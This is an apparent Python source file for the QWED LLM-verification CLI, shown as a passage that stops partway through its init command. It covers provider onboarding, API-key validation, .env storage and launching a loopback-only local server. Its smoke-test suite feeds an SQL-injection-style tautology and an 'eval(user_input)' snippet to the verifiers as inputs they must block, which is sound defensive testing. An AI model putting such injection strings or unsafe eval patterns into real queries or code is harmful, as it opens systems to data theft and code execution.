# Copyright (c) 2026 QWED Team
# SPDX-License-Identifier: Apache-2.0

"""
QWED CLI - Beautiful command-line interface for verification.

Usage:
    qwed verify "What is 2+2?"
    qwed verify "derivative of x^2" --provider ollama
    qwed cache stats
    qwed config set provider openai
"""

import json
import logging
import os
import secrets
import socket
import subprocess
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import click

# Import after path setup
try:
    from qwed_sdk import QWEDLocal, __version__
    from qwed_sdk.qwed_local import QWED, HAS_COLOR
except ImportError:
    click.echo("Error: QWED SDK not installed. Run: pip install qwed", err=True)
    sys.exit(1)

logger = logging.getLogger(__name__)


@click.group()
@click.version_option(__version__, prog_name="qwed")
def cli():
    """
    QWED - Model Agnostic AI Verification
    
    Verify LLM outputs with mathematical precision.
    Works with Ollama, OpenAI, Anthropic, Gemini, and more!
    """
    pass

SEPARATOR = "-" * 41
ANTHROPIC_CLAUDE_LABEL = "Anthropic Claude"
OLLAMA_DEFAULT_BASE_URL = "http://localhost:11434/v1"
SQLITE_URL_PREFIX = "sqlite:///"
SQLITE_MEMORY_URL = f"{SQLITE_URL_PREFIX}:memory:"
DEFAULT_DATABASE_URL = f"{SQLITE_URL_PREFIX}./qwed.db"
LOCAL_SERVER_HOSTPORT = "localhost:8000"
LOCAL_SERVER_SCHEME = "http"
REMOTE_SERVER_SCHEME = "https"
MATH_LABEL_VALID = "2+2=4"
MATH_LABEL_INVALID = "2+2=5"
MATH_LABEL_LARGE = "997*998*999"
LOGIC_LABEL_UNSAT = "x>5 AND x<3"
PLACEHOLDER_API_KEY_VALUES = {
    "apikey",
    "changeme",
    "dummy",
    "example",
    "none",
    "null",
    "placeholder",
    "sample",
    "test",
    "xxx",
    "xxxx",
    "xxxxx",
    "yourapikey",
}


@dataclass(frozen=True)
class OnboardingProvider:
    slug: str
    name: str
    active_provider: str
    key_env: str
    model_env: str
    base_url_env: Optional[str]
    default_model: str
    default_base_url: Optional[str]
    connection_slug: Optional[str]
    key_pattern: Optional[str] = None


def _project_root() -> Path:
    return Path(__file__).resolve().parent.parent


def _src_path() -> str:
    return str(_project_root() / "src")


def _load_dotenv_if_available(*, override: bool = False) -> None:
    try:
        from dotenv import find_dotenv, load_dotenv

        dotenv_path = find_dotenv(usecwd=True)
        if dotenv_path:
            load_dotenv(dotenv_path=dotenv_path, override=override)
        else:
            load_dotenv(override=override)
    except ImportError:
        return


def _normalize_provider_choice(value: Optional[str]) -> str:
    return (value or "").strip().lower().replace("_", "-")


def _sanitize_org_slug(org_name: str) -> str:
    lowered = "".join(ch if ch.isalnum() else "-" for ch in org_name.lower())
    cleaned = "-".join(filter(None, lowered.split("-")))
    return cleaned or "qwed-org"


def _safe_json_detail(response_text: str) -> str:
    try:
        payload = json.loads(response_text)
    except Exception:
        return response_text.strip() or "unknown error"

    if isinstance(payload, dict):
        detail = payload.get("detail")
        if isinstance(detail, str):
            return detail
    return response_text.strip() or "unknown error"


def _build_onboarding_provider_map(get_provider) -> Dict[str, OnboardingProvider]:
    key_patterns: Dict[str, Optional[str]] = {}
    for registry_slug in ("openai", "anthropic", "openai-compatible"):
        try:
            key_patterns[registry_slug] = get_provider(registry_slug).key_pattern
        except Exception:
            key_patterns[registry_slug] = None

    return {
        "nvidia": OnboardingProvider(
            slug="nvidia",
            name="NVIDIA NIM",
            active_provider="openai_compat",
            key_env="CUSTOM_API_KEY",
            model_env="CUSTOM_MODEL",
            base_url_env="CUSTOM_BASE_URL",
            default_model="nvidia/nemotron-3-super-120b-a12b",
            default_base_url="https://integrate.api.nvidia.com/v1",
            connection_slug="openai-compatible",
            key_pattern=None,
        ),
        "openai": OnboardingProvider(
            slug="openai",
            name="OpenAI",
            active_provider="openai",
            key_env="OPENAI_API_KEY",
            model_env="OPENAI_MODEL",
            base_url_env=None,
            default_model="gpt-4o-mini",
            default_base_url=None,
            connection_slug="openai",
            key_pattern=key_patterns.get("openai"),
        ),
        "anthropic": OnboardingProvider(
            slug="anthropic",
            name=ANTHROPIC_CLAUDE_LABEL,
            active_provider="anthropic",
            key_env="ANTHROPIC_API_KEY",
            model_env="ANTHROPIC_MODEL",
            base_url_env=None,
            default_model="claude-sonnet-4-20250514",
            default_base_url=None,
            connection_slug="anthropic",
            key_pattern=key_patterns.get("anthropic"),
        ),
        "gemini": OnboardingProvider(
            slug="gemini",
            name="Google Gemini",
            active_provider="gemini",
            key_env="GOOGLE_API_KEY",
            model_env="GEMINI_MODEL",
            base_url_env=None,
            default_model="gemini-1.5-pro",
            default_base_url=None,
            connection_slug="gemini",
            key_pattern=None,
        ),
        "custom": OnboardingProvider(
            slug="custom",
            name="Custom Provider",
            active_provider="openai_compat",
            key_env="CUSTOM_API_KEY",
            model_env="CUSTOM_MODEL",
            base_url_env="CUSTOM_BASE_URL",
            default_model="gpt-4o-mini",
            default_base_url="https://api.openai.com/v1",
            connection_slug="openai-compatible",
            key_pattern=key_patterns.get("openai-compatible"),
        ),
    }


def _required_engine_report() -> tuple[bool, list[dict]]:
    report: list[dict] = []

    required = [
        ("SymPy", "sympy", "math engine ready", "pip install sympy"),
        ("Z3", "z3", "logic engine ready", "pip install z3-solver"),
        ("AST", "ast", "code engine ready", "Python standard library"),
        ("SQLGlot", "sqlglot", "sql engine ready", "pip install sqlglot"),
    ]

    all_ready = True
    for label, module_name, detail, install_hint in required:
        try:
            module = __import__(module_name)
            version = getattr(module, "__version__", "built-in")
            if module_name == "z3" and hasattr(module, "get_version_string"):
                version = module.get_version_string()
            report.append(
                {
                    "name": label,
                    "ready": True,
                    "detail": detail,
                    "install_hint": install_hint,
                    "version": str(version),
                }
            )
        except Exception:
            all_ready = False
            report.append(
                {
                    "name": label,
                    "ready": False,
                    "detail": "missing",
                    "install_hint": install_hint,
                    "version": None,
                }
            )

    return all_ready, report


def _run_init_smoke_suite() -> list[dict]:
    from qwed_new.core.code_verifier import CodeVerifier
    from qwed_new.core.logic_verifier import LogicVerifier
    from qwed_new.core.sql_verifier import SQLVerifier
    from qwed_new.core.verifier import VerificationEngine

    tests: list[dict] = []

    math_engine = VerificationEngine()
    logic_engine = LogicVerifier()
    sql_engine = SQLVerifier()
    code_engine = CodeVerifier()

    math_bad = math_engine.verify_math("2+2", 5)
    tests.append(
        {
            "label": MATH_LABEL_INVALID,
            "passed": math_bad.get("status") == "CORRECTION_NEEDED",
            "result": "BLOCKED",
        }
    )

    logic_bad = logic_engine.verify_logic({"x": "Int"}, ["x > 5", "x < 3"])
    tests.append(
        {
            "label": LOGIC_LABEL_UNSAT,
            "passed": logic_bad.status == "UNSAT",
            "result": "UNSAT",
        }
    )

    sql_bad = sql_engine.verify_sql("SELECT * FROM users WHERE 1=1 OR 1=1")
    tests.append(
        {
            "label": "SELECT * WHERE 1=1",
            "passed": sql_bad.get("status") == "BLOCKED",
            "result": "BLOCKED",
        }
    )

    code_bad = code_engine.verify_code("eval(user_input)", language="python")
    tests.append(
        {
            "label": "eval(user_input)",
            "passed": code_bad.get("status") == "BLOCKED",
            "result": "BLOCKED",
        }
    )
    return tests


def _test_gemini_connection(api_key: str) -> tuple[bool, str]:
    import httpx

    try:
        response = httpx.get(
            "https://generativelanguage.googleapis.com/v1beta/models",
            params={"key": api_key},
            timeout=5.0,
        )
    except httpx.ConnectError:
        return False, "Cannot connect to Gemini endpoint."
    except httpx.TimeoutException:
        return False, "Connection timed out (5s)."

    if response.status_code == 200:
        return True, "Connected to Gemini API."
    if response.status_code in (401, 403):
        return False, "Authentication failed. Check your API key."
    return False, f"Gemini returned status {response.status_code}"


def _ensure_gitignore_protection_noninteractive(verify_gitignore, add_env_to_gitignore) -> None:
    if verify_gitignore():
        return
    if not add_env_to_gitignore():
        raise RuntimeError("Failed to update .gitignore with .env entry.")


def _check_server_health(server_url: str, timeout: float = 2.0) -> bool:
    import httpx

    try:
        response = httpx.get(f"{server_url.rstrip('/')}/health", timeout=timeout)
    except (httpx.HTTPError, ValueError):
        return False
    return response.status_code == 200


def _validate_local_server_target(server_url: str) -> tuple[str, str]:
    from urllib.parse import urlparse

    parsed = urlparse(server_url)
    host = parsed.hostname or "127.0.0.1"
    port_value = parsed.port or 8000
    allowed_hosts = {"127.0.0.1", "localhost", "::1"}

    if host not in allowed_hosts:
        raise ValueError(f"Local server host must be loopback; got '{host}'")
    if not (1024 <= int(port_value) <= 65535):
        raise ValueError(f"Local server port must be in range 1024-65535; got '{port_value}'")
    return host, str(port_value)


def _normalize_local_server_url(server_url: str) -> str:
    from urllib.parse import urlparse

    parsed = urlparse(server_url)
    scheme = (parsed.scheme or "http").lower()
    if scheme not in {"http", "https"}:
        raise ValueError(f"Local server scheme must be http or https; got '{scheme}'")

    host, port = _validate_local_server_target(server_url)
    if ":" in host and not host.startswith("["):
        host = f"[{host}]"
    return f"{scheme}://{host}:{port}"


def _guarded_popen(command: list[str], popen_kwargs: Dict[str, Any]) -> subprocess.Popen:
    from qwed_new.guards.code_guard import CodeGuard

    guard = CodeGuard()
    preview = " ".join(command)
    result = guard.verify_safety(preview, language="bash")
    if not result.get("verified", False):
        raise RuntimeError("Server launch blocked by CodeGuard policy.")

    return subprocess.Popen(command, **popen_kwargs)  # noqa: S603


def _resolve_server_runtime_dir() -> Path:
    runtime_dir = Path.cwd().resolve()
    if os.access(runtime_dir, os.W_OK):
        return runtime_dir

    fallback_dir = (Path.home() / "qwed-demo").resolve()
    fallback_dir.mkdir(parents=True, exist_ok=True)
    return fallback_dir


def _runtime_sqlite_database_url(runtime_dir: Path) -> str:
    db_path = (runtime_dir / "qwed.db").resolve()
    return f"sqlite:///{db_path.as_posix()}"


def _ensure_local_server_running(server_url: str, jwt_secret: str) -> tuple[bool, bool]:
    normalized_server_url = _normalize_local_server_url(server_url)
    if _check_server_health(normalized_server_url):
        return True, False

    host, port = _validate_local_server_target(normalized_server_url)
    runtime_dir = _resolve_server_runtime_dir()

    env = os.environ.copy()
    src = _src_path()
    current_pythonpath = env.get("PYTHONPATH", "")
    if src not in current_pythonpath.split(os.pathsep):
        env["PYTHONPATH"] = f"{src}{os.pathsep}{current_pythonpath}" if current_pythonpath else src
    env["QWED_JWT_SECRET_KEY"] = jwt_secret
    env["DATABASE_URL"] = _runtime_sqlite_database_url(runtime_dir)

    command = [
        sys.executable,
        "-m",
        "uvicorn",
        "qwed_new.api.main:app",
        "--host",
        host,
        "--port",
        port,
    ]

    popen_kwargs: Dict[str, Any] = {
        "cwd": str(runtime_dir),
        "env": env,
        "stdout": subprocess.DEVNULL,
        "stderr": subprocess.DEVNULL,
    }
    if os.name == "nt":
        popen_kwargs["creationflags"] = (
            subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
        )
    else:
        popen_kwargs["start_new_session"] = True

    process = _guarded_popen(command, popen_kwargs)
    for _ in range(15):
        if _check_server_health(normalized_server_url):
            return True, True
        time.sleep(1)

    try:
        process.terminate()
    except Exception:
        try:
            process.kill()
        except Exception:
            logger.debug("Failed to kill orphaned uvicorn process after startup timeout", exc_info=True)
    return False, True


def _bootstrap_api_key(server_url: str, organization_name: str) -> tuple[str, str]:
    import httpx

    base = server_url.rstrip("/")
    org_slug = _sanitize_org_slug(organization_name)
    email = f"{org_slug}-{secrets.token_hex(4)}@qwed-init.dev"
    password = secrets.token_urlsafe(24)
    signup_payload = {
        "email": email,
        "password": password,
        "organization_name": organization_name,
    }

    with httpx.Client(timeout=10.0) as client:
        signup_resp = client.post(f"{base}/auth/signup", json=signup_payload)
        if signup_resp.status_code >= 400:
            detail = _safe_json_detail(signup_resp.text)
            if signup_resp.status_code == 400 and "already taken" in detail.lower():
                fallback_org = f"{organization_name}-{secrets.token_hex(2)}"
                signup_payload["organization_name"] = fallback_org
                signup_resp = client.post(f"{base}/auth/signup", json=signup_payload)
                if signup_resp.status_code >= 400:
                    raise RuntimeError(f"Signup failed: {_safe_json_detail(signup_resp.text)}")
                organization_name = fallback_org
            else:
                raise RuntimeError(f"Signup failed: {detail}")

        token = signup_resp.json().get("access_token")
        if not token:
            raise RuntimeError("Signup succeeded but no access token returned.")

        api_resp = client.post(
            f"{base}/auth/api-keys",
            json={"name": "CLI Default Key"},
            headers={"Authorization": f"Bearer {token}"},
        )
        if api_resp.status_code >= 400:
            raise RuntimeError(f"API key generation failed: {_safe_json_detail(api_resp.text)}")

        key = api_resp.json().get("key")
        if not key:
            raise RuntimeError("API key endpoint returned no key.")

    return key, organization_name


def _print_init_header():
    """Print branded init wizard header."""
    click.echo()
    if HAS_COLOR:
        click.echo(f"{QWED.BRAND}{'-' * 50}{QWED.RESET}")
        click.echo(f"{QWED.BRAND}QWED - Secure LLM Configuration{QWED.RESET}")
        click.echo(f"{QWED.BRAND}{'-' * 50}{QWED.RESET}")
    else:
        click.echo("-" * 50)
        click.echo("QWED - Secure LLM Configuration")
        click.echo("-" * 50)
    click.echo()
def _select_provider(providers) -> Any:
    """Prompt user to select a provider."""
    click.echo("Select your LLM provider:\n")
    for i, p in enumerate(providers, 1):
        hint = f" ({p.key_hint})" if p.key_hint else ""
        if HAS_COLOR:
            click.echo(f"  {QWED.VALUE}{i}.{QWED.RESET} {p.name}{QWED.INFO}{hint}{QWED.RESET}")
        else:
            click.echo(f"  {i}. {p.name}{hint}")
    click.echo()

    choice = click.prompt("Enter number", type=int)
    if choice < 1 or choice > len(providers):
        click.echo(
            f"{QWED.ERROR if HAS_COLOR else ''}ERROR: Invalid choice{QWED.RESET if HAS_COLOR else ''}",
            err=True,
        )
        sys.exit(1)

    provider = providers[choice - 1]
    click.echo()
    if HAS_COLOR:
        click.echo(f"{QWED.SUCCESS}OK: Selected: {provider.name}{QWED.RESET}")
    else:
        click.echo(f"OK: Selected: {provider.name}")

    if provider.install_cmd:
        click.echo(f"\nRequires: {provider.install_cmd}")
    return provider
def _is_url_env(name: str) -> bool:
    return "URL" in name or "ENDPOINT" in name

def _is_key_env(name: str) -> bool:
    return "KEY" in name or "key" in name.lower() or "API" in name

def _prompt_for_env_var(env_var):
    name = env_var.name
    desc = env_var.description
    default = env_var.default or ""

    if _is_key_env(name):
        click.echo()
        return click.prompt(f"  Key: {desc}", hide_input=True, default=default)
    if _is_url_env(name):
        return click.prompt(f"  URL: {desc}", default=default, show_default=True)
    return click.prompt(f"  {desc}", default=default, show_default=True)
def _collect_single_credential(env_var, is_local_auth: bool):
    """Prompt user for a single env var until valid. Returns (val, is_key, is_url)."""
    if is_local_auth and not env_var.required and not _is_url_env(env_var.name):
        return env_var.default or "", False, False

    while True:
        val = _prompt_for_env_var(env_var)
        val = val.strip() if val else ""

        if env_var.required and not val:
            click.echo(f"  ERROR: {env_var.name} is required. Please provide a valid value.", err=True)
            continue

        is_key = bool(_is_key_env(env_var.name) and val)
        is_url = bool(_is_url_env(env_var.name) and val)
        return val, is_key, is_url
def _collect_credentials(provider, auth_type_enum) -> tuple:
    """Collect env vars, key, and base_url from user input."""
    env_vars = {}
    collected_key = None
    collected_base_url = None
    is_local = (provider.auth_type == auth_type_enum.LOCAL)

    for env_var in provider.env_vars:
        val, is_key, is_url = _collect_single_credential(env_var, is_local)
        env_vars[env_var.name] = val
        if is_key:
            collected_key = val
        elif is_url:
            collected_base_url = val

    return env_vars, collected_key, collected_base_url

def _validate_key(provider, collected_key, validate_key_format):
    if not (collected_key and provider.key_pattern):
        return
    is_valid, msg = validate_key_format(collected_key, provider.key_pattern)
    click.echo()
    if is_valid:
        c_msg = f"{QWED.SUCCESS}OK: {msg}{QWED.RESET}" if HAS_COLOR else f"OK: {msg}"
        click.echo(c_msg)
    else:
        w_msg = f"{QWED.WARNING}WARNING: {msg}{QWED.RESET}" if HAS_COLOR else f"WARNING: {msg}"
        p_msg = (
            f"{QWED.INFO}   Proceeding anyway (some providers have non-standard key formats){QWED.RESET}"
            if HAS_COLOR
            else "   Proceeding anyway (some providers have non-standard key formats)"
        )
        click.echo(w_msg)
        click.echo(p_msg)


def _test_connection_interactive(provider, collected_key, collected_base_url, test_connection, auth_type_enum):
    if provider.auth_type != auth_type_enum.LOCAL:
        should_test = click.confirm("\nWould you like to test the connection?", default=False)
    else:
        should_test = True

    if not should_test:
        return

    click.echo("   Testing... ", nl=False)
    success, msg = test_connection(
        provider_slug=provider.slug,
        api_key=collected_key,
        base_url=collected_base_url,
    )
    if success:
        c_msg = f"{QWED.SUCCESS}OK: {msg}{QWED.RESET}" if HAS_COLOR else f"OK: {msg}"
        click.echo(c_msg)
    else:
        e_msg = f"{QWED.ERROR}ERROR: {msg}{QWED.RESET}" if HAS_COLOR else f"ERROR: {msg}"
        click.echo(e_msg)
        if not click.confirm("   Continue anyway?", default=True):
            sys.exit(1)


def _validate_and_test_connection(provider, collected_key, collected_base_url, validate_key_format, test_connection, auth_type_enum) -> bool:
    """Run format validation and optional connection test."""
    _validate_key(provider, collected_key, validate_key_format)
    _test_connection_interactive(provider, collected_key, collected_base_url, test_connection, auth_type_enum)
    return True

def _ensure_gitignore_protection(verify_gitignore, add_env_to_gitignore) -> bool:
    """Verify or add .env to .gitignore, abort if cannot protect."""
    if verify_gitignore():
        if HAS_COLOR:
            click.echo(f"\n{QWED.SUCCESS}Verified: .gitignore includes .env{QWED.RESET}")
        else:
            click.echo("\nVerified: .gitignore includes .env")
    else:
        if HAS_COLOR:
            click.echo(f"\n{QWED.WARNING}WARNING: .env not found in .gitignore.{QWED.RESET}")
        else:
            click.echo("\nWARNING: .env not found in .gitignore.")
        if click.confirm("   Add .env to .gitignore?", default=True):
            if add_env_to_gitignore():
                click.echo("   OK: Added .env to .gitignore")
            else:
                click.echo("   ERROR: Failed to update .gitignore - aborting to protect secrets", err=True)
                sys.exit(1)
        else:
            click.echo("   WARNING: Aborting without .gitignore protection for .env", err=True)
            sys.exit(1)
    return True


def _import_init_dependencies():
    from qwed_new.config import ensure_jwt_secret
    from qwed_new.providers.credential_store import (
        add_env_to_gitignore,
        verify_gitignore,
        write_env_file,
    )
    from qwed_new.providers.key_validator import test_connection, validate_key_format
    from qwed_new.providers.registry import get_provider

    return (
        ensure_jwt_secret,
        add_env_to_gitignore,
        verify_gitignore,
        write_env_file,
        test_connection,
        validate_key_format,
        get_provider,
    )


def _run_init_engine_phase(skip_tests: bool) -> None:
    click.echo("[QWED] Initializing verification engines...")
    all_ready, engine_report = _required_engine_report()
    for item in engine_report:
        if item["ready"]:
            click.echo(f"  [ok] {item['name']:<8} {item['detail']}")
        else:
            click.echo(f"  [x]  {item['name']:<8} missing  -> {item['install_hint']}")

    if not all_ready:
        raise RuntimeError("Engine initialization failed. Install missing dependencies and retry.")

    if skip_tests:
        click.echo("\nSkipping verification suite (--skip-tests).")
        return

    click.echo("\nRunning verification suite...")
    suite = _run_init_smoke_suite()
    failed = [case for case in suite if not case["passed"]]
    for case in suite:
        marker = "[ok]" if case["passed"] else "[x]"
        click.echo(f"  {marker} {case['label']:<24} -> {case['result']}")
    if failed:
        raise RuntimeError("Built-in verification suite failed. Resolve before onboarding.")
    click.echo("\nAll engines verified. QWED is operational.")


def _resolve_onboarding_profile(
    provider_choice: Optional[str],
    non_interactive: bool,
    provider_map: Dict[str, OnboardingProvider],
) -> OnboardingProvider:
    selected = _normalize_provider_choice(
        provider_choice or os.getenv("QWED_PROVIDER") or ("nvidia" if non_interactive else "")
    )

    if not selected:
        click.echo("Select provider:")
        click.echo("  1. NVIDIA NIM")
        click.echo("  2. OpenAI")
        click.echo(f"  3. {ANTHROPIC_CLAUDE_LABEL}")
        click.echo("  4. Google Gemini")
        click.echo("  5. Custom Provider  (any OpenAI-compatible API)")
        choice = click.prompt("\nProvider", default=1, type=int)
        options = ["nvidia", "openai", "anthropic", "gemini", "custom"]
        if choice < 1 or choice > len(options):
            raise RuntimeError("Invalid provider selection.")
        selected = options[choice - 1]

    if selected not in provider_map:
        raise RuntimeError(f"Unsupported provider '{selected}'.")
    return provider_map[selected]


def _resolve_provider_credentials(
    profile: OnboardingProvider,
    api_key: Optional[str],
    base_url: Optional[str],
    model: Optional[str],
    non_interactive: bool,
) -> tuple[str, str, str]:
    resolved_key = _resolve_provider_api_key(profile, api_key)
    resolved_base_url = _resolve_provider_base_url(profile, base_url, non_interactive)
    resolved_model = _resolve_provider_model(profile, model)

    if not resolved_key and not non_interactive:
        resolved_key = click.prompt(f"{profile.name} API key", hide_input=True).strip()
    if not resolved_model and not non_interactive:
        resolved_model = click.prompt(
            f"{profile.name} default model",
            default=profile.default_model,
            show_default=True,
        ).strip()

    return resolved_key, resolved_base_url, resolved_model


def _resolve_provider_api_key(profile: OnboardingProvider, api_key: Optional[str]) -> str:
    direct_key = (api_key or "").strip()
    env_key = os.getenv(profile.key_env, "").strip()
    nvidia_fallback = os.getenv("NVIDIA_API_KEY", "").strip() if profile.slug == "nvidia" else ""

    if _looks_like_placeholder_api_key(direct_key, profile.slug):
        direct_key = ""
    if _looks_like_placeholder_api_key(env_key, profile.slug):
        env_key = ""
    if _looks_like_placeholder_api_key(nvidia_fallback, profile.slug):
        nvidia_fallback = ""

    return direct_key or env_key or nvidia_fallback


def _looks_like_placeholder_api_key(value: str, provider_slug: str) -> bool:
    if not value:
        return False

    lowered = value.strip().lower()
    normalized = lowered.replace(" ", "").replace("-", "").replace("_", "")

    if normalized in PLACEHOLDER_API_KEY_VALUES:
        return True
    if "placeholder" in normalized:
        return True
    if "changeme" in normalized:
        return True
    if lowered.startswith(("your-", "replace-")) and "key" in lowered:
        return True
    if len(normalized) >= 3 and set(normalized) <= {"x", "*", "."}:
        return True

    # NVIDIA placeholders commonly look like nvapi-xxxx and should always reprompt.
    if provider_slug == "nvidia" and lowered.startswith("nvapi-") and len(value.strip()) < 20:
        return True

    return False


def _resolve_provider_base_url(
    profile: OnboardingProvider,
    base_url: Optional[str],
    non_interactive: bool,
) -> str:
    if not profile.base_url_env:
        return ""

    resolved_base_url = (base_url or os.getenv(profile.base_url_env, "")).strip()
    if resolved_base_url:
        return resolved_base_url

    if non_interactive:
        return profile.default_base_url or ""

    return click.prompt(
        f"{profile.name} base URL",
        default=profile.default_base_url or "",
        show_default=True,
    ).strip()


def _resolve_provider_model(profile: OnboardingProvider, model: Optional[str]) -> str:
    return (model or os.getenv(profile.model_env) or profile.default_model).strip()


def _validate_provider_credentials(
    profile: OnboardingProvider,
    resolved_key: str,
    resolved_base_url: str,
    non_interactive: bool,
    validate_key_format,
) -> None:
    if not resolved_key:
        raise RuntimeError(f"{profile.key_env} is required for provider '{profile.slug}'.")
    if profile.base_url_env and not resolved_base_url:
        raise RuntimeError(f"{profile.base_url_env} is required for provider '{profile.slug}'.")

    if not profile.key_pattern:
        return

    is_valid, message = validate_key_format(resolved_key, profile.key_pattern)
    if not is_valid and non_interactive:
        raise RuntimeError(f"Key validation failed: {message}")
    if not is_valid:
        click.echo(f"Warning: {message}")


def _test_provider_connection_loop(
    profile: OnboardingProvider,
    resolved_key: str,
    resolved_base_url: str,
    resolved_model: str,
    non_interactive: bool,
    test_connection,
) -> tuple[str, str, str]:
    while True:
        click.echo("\n  Testing connection...")
        success, message = _run_provider_connection_test(
            profile=profile,
            resolved_key=resolved_key,
            resolved_base_url=resolved_base_url,
            resolved_model=resolved_model,
            test_connection=test_connection,
        )

        if success:
            click.echo("  [ok] Provider connected")
            click.echo("  [ok] Model responding")
            return resolved_key, resolved_base_url, resolved_model

        _raise_if_no_retry(non_interactive, message)
        if not click.confirm("  Retry with updated credentials?", default=True):
            raise RuntimeError("Connection test aborted by user.")
        resolved_key, resolved_base_url, resolved_model = _prompt_retry_credentials(
            profile=profile,
            resolved_base_url=resolved_base_url,
            resolved_model=resolved_model,
        )


def _run_provider_connection_test(
    profile: OnboardingProvider,
    resolved_key: str,
    resolved_base_url: str,
    resolved_model: str,
    test_connection,
) -> tuple[bool, str]:
    if profile.connection_slug == "gemini":
        return _test_gemini_connection(resolved_key)

    return test_connection(
        provider_slug=profile.connection_slug or "",
        api_key=resolved_key,
        base_url=resolved_base_url or None,
        model=resolved_model,
    )


def _raise_if_no_retry(non_interactive: bool, message: str) -> None:
    click.echo(f"  [x] {message}", err=True)
    if non_interactive:
        raise RuntimeError(message)


def _prompt_retry_credentials(
    profile: OnboardingProvider,
    resolved_base_url: str,
    resolved_model: str,
) -> tuple[str, str, str]:
    updated_key = click.prompt(f"{profile.name} API key", hide_input=True).strip()
    updated_base_url = resolved_base_url
    if profile.base_url_env:
        updated_base_url = click.prompt(
            f"{profile.name} base URL",
            default=resolved_base_url or profile.default_base_url or "",
            show_default=True,
        ).strip()
    updated_model = click.prompt(
        f"{profile.name} default model",
        default=resolved_model or profile.default_model,
        show_default=True,
    ).strip()
    return updated_key, updated_base_url, updated_model


def _persist_onboarding_env(
    profile: OnboardingProvider,
    resolved_key: str,
    resolved_base_url: str,
    resolved_model: str,
    ensure_jwt_secret,
    verify_gitignore,
    add_env_to_gitignore,
    write_env_file,
    non_interactive: bool,
) -> tuple[str, str]:
    env_vars = {profile.key_env: resolved_key, profile.model_env: resolved_model}
    if profile.base_url_env:
        env_vars[profile.base_url_env] = resolved_base_url

    try:
        jwt_secret = ensure_jwt_secret()
    except Exception as exc:
        logger.exception("JWT secret preparation failed")
        raise RuntimeError(f"Failed to prepare JWT secret: {type(exc).__name__}") from exc

    env_vars["QWED_JWT_SECRET_KEY"] = jwt_secret

    try:
        if non_interactive:
            _ensure_gitignore_protection_noninteractive(verify_gitignore, add_env_to_gitignore)
        else:
            _ensure_gitignore_protection(verify_gitignore, add_env_to_gitignore)
        env_path = write_env_file(env_vars, active_provider=profile.active_provider)
    except Exception as exc:
        logger.exception("Credential persistence failed")
        raise RuntimeError(f"Failed to store credentials securely: {type(exc).__name__}") from exc

    os.environ.update(env_vars)
    os.environ["ACTIVE_PROVIDER"] = profile.active_provider
    click.echo("  [ok] Credentials stored (.env, mode 0600)")
    return jwt_secret, env_path


def _resolve_organization_name(organization_name: Optional[str], non_interactive: bool) -> str:
    resolved_org = (organization_name or "").strip()
    if not resolved_org:
        resolved_org = os.getenv("QWED_ORGANIZATION_NAME", "").strip()
    if not resolved_org and non_interactive:
        resolved_org = f"qwed-{secrets.token_hex(2)}"
    if not resolved_org:
        resolved_org = click.prompt("Organization name").strip()
    if not resolved_org:
        raise RuntimeError("Organization name is required.")
    return resolved_org


@cli.command()
@click.option(
    "--provider",
    "provider_choice",
    type=click.Choice(["nvidia", "openai", "anthropic", "gemini", "custom"], case_sensitive=False),
    default=None,
    help="Provider to configure.",
)
@click.option("--api-key", default=None, help="Provider API key.")
@click.option("--base-url", default=None, help="Base URL for custom/openai-compatible providers.")
@click.option("--model", default=None, help="Default model for provider.")
@click.option("--organization-name", default=None, help="Organization name for local API key bootstrap.")
@click.option("--server-url", default="http://localhost:8000", show_default=True, help="Local QWED server URL.")
@click.option("--non-interactive", is_flag=True, help="Run without prompts (CI-friendly).")
@click.option("--skip-tests", is_flag=True, help="Skip deterministic verification smoke tests.")
def init(
    provider_choice: Optional[str],
    api_key: Optional[str],
    base_url: Optional[str],
    model: Optional[str],
    organization_name: Optional[str],
    server_url: str,
    non_interactive: bool,
    skip_tests: bool,
):
    """Initialize QWED onboarding: engines, provider credentials, and local API key bootstrap."""
    _load_dotenv_if_available()

    try:
        (
            ensure_jwt_secret,
            add_env_to_gitignore,
            verify_gitignore,
            write_env_file,
            test_connection,
            validate_key_format,
            get_provider,
        ) = _import_init_dependencies()
    except ImportError as exc:
        click.echo(f"QWED core not found: {type(exc).__name__}", err=True)
        sys.exit(1)

    provider_map = _build_onboarding_provider_map(get_provider)
    try:
        _run_init_engine_phase(skip_tests)
    except RuntimeError as exc:
        click.echo(f"\n{exc}", err=True)
        sys.exit(1)

    click.echo(f"\n{SEPARATOR}")
    click.echo("Step 1/3: LLM Provider Setup")
    click.echo(SEPARATOR)
    click.echo("QWED uses an LLM for natural language translation.")
    click.echo("The LLM is treated as an untrusted translator.")
    click.echo("All outputs are verified deterministically.\n")
    try:
        profile = _resolve_onboarding_profile(provider_choice, non_interactive, provider_map)
    except RuntimeError as exc:
        click.echo(str(exc), err=True)
        sys.exit(1)

    click.echo(f"\n{SEPARATOR}")
    click.echo("Step 2/3: API Key")
    click.echo(SEPARATOR)

    try:
        resolved_key, resolved_base_url, resolved_model = _resolve_provider_credentials(
            profile=profile,
            api_key=api_key,
            base_url=base_url,
            model=model,
            non_interactive=non_interactive,
        )
        _validate_provider_credentials(
            profile=profile,
            resolved_key=resolved_key,
            resolved_base_url=resolved_base_url,
            non_interactive=non_interactive,
            validate_key_format=validate_key_format,
        )
        resolved_key, resolved_base_url, resolved_model = _test_provider_connection_loop(
            profile=profile,
            resolved_key=resolved_key,
            resolved_base_url=resolved_base_url,
            resolved_model=resolved_model,
            non_interactive=non_interactive,
            test_connection=test_connection,
        )
        jwt_secret, env_path = _persist_onboarding_env(
            profile=profile,
            resolved_key=resolved_key,
            resolved_base_url=resolved_base_url,
            resolved_model=resolved_model,
            ensure_jwt_secret=ensure_jwt_secret,
            verify_gitignore=verify_gitignore,
            add_env_to_gitignore=add_env_to_gitignore,
            write_env_file=write_env_file,
            non_interactive=non_interactive,
        )
    except RuntimeError as exc:
        click.echo(str(exc), err=True)
        sys.exit(1)

    click.echo(f"\n{SEPARATOR}")
    click.echo("Step 3/3: Generate QWED API Key")
    click.echo(SEPARATOR)

    try:
        organization_name = _resolve_organization_name(organization_name, non_interactive)
        normalized_server_url = _normalize_local_server_url(server_url)
    except RuntimeError as exc:
        click.echo(str(exc), err=True)
        sys.exit(1)
    except ValueError as exc:
        click.echo(f"  [x] Invalid server URL: {exc}", err=True)
        sys.exit(1)

    click.echo("\n  Starting local server...")
    try:
        server_ready, started_new = _ensure_local_server_running(normalized_server_url, jwt_secret)
    except ValueError as exc:
